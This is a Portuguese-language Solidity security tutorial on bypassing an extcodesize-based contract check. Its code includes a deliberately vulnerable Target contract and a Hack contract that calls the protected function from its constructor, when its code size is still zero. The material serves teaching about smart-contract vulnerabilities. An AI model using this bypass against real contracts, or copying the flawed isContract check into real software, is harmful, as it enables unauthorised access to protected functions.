# Ignorar a Verificação do Tamanho do Contrato

#### Vulnerabilidade <a href="#vulnerability" id="vulnerability"></a>

Se o endereço for um contrato, o tamanho do código armazenado no endereço será maior que  0 certo?

Vamos ver como podemos criar um contrato com tamanho de código retornado  `extcodesize` igual a 0.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

contract Target {
    function isContract(address account) public view returns (bool) {
        // Esse método tem como base o extcodesize, que retorna 0 para contratos
        // em construção, desde que o código seja somente armazenado no 
        // final da execução do constructor.
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // Tentativa de chamar Target.protected falhará,
    // Chamadas de bloco alvo do contrato
    function pwn(address _target) external {
        // Isso vai falhar
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // Quando o contrato está sendo criado, o tamanho do código (extcodesize) é 0.
    // Isso vai ignorar a verificação do isContract()
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // Isso vai funcionar
        Target(_target).protected();
    }
}
```
